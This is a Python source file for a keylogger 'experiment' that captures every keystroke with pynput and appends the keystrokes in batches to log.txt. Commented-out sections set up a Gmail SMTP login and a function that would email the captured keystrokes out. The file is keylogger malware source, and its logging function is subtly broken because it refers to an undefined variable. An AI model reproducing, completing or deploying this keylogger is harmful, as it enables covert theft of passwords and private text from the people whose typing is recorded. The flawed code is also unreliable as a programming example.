########################################################################
#                                                                      #
#                    Super Awesome Project                             #
#                    Keylogging experiment                             #
#                                                                      #
########################################################################

import logging #for logging to a file
import smtplib #for sending email using SMTP protocol (gmail)

from pynput.keyboard import Key, Listener # for keylogs


########################################################################
#                                                                      #
#                    Emailing keylog - Disabled                        #
#                                                                      #
########################################################################

# email which receives the keystrokes 

# email = 'your@gmail.com'
# password = 'password'
# server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
# server.login(email, password)

# full_log = ""
# word = ""
# email_char_limit = 60 

# set how many charcters to store before sending

########################################################################
#                                                                      #
#                Keylogging function - In Progress                     #
#                                                                      #
########################################################################

count = 0
keys = []

# The Code that Appends the Key that is Press and Save
def on_press(key):
    global keys, count

    # counts the number of keys stored in list then saves it in file
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            clean_key = str(key).replace("'","")
            # if there is a space, make a newline
            if k.find("space") > 0:
                f.write('\n')
            # if key doesnt exist, then -1 will be written
            elif k.find("Key") == -1:
                f.write(clean_key)

def on_release(key):
    if key == Key.esc:
        return False

########################################################################
#                                                                      #
#                    Emailing keylog - Disabled                        #
#                                                                      #
########################################################################
# send the Code that Sends the Append Keys is Press
# def send_log():
#     server.sendmail(
#         email,
#         email,
#         full_log
#     )


########################################################################
#                                                                      #
#                    With Listener                                     #
#                                                                      #
########################################################################
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
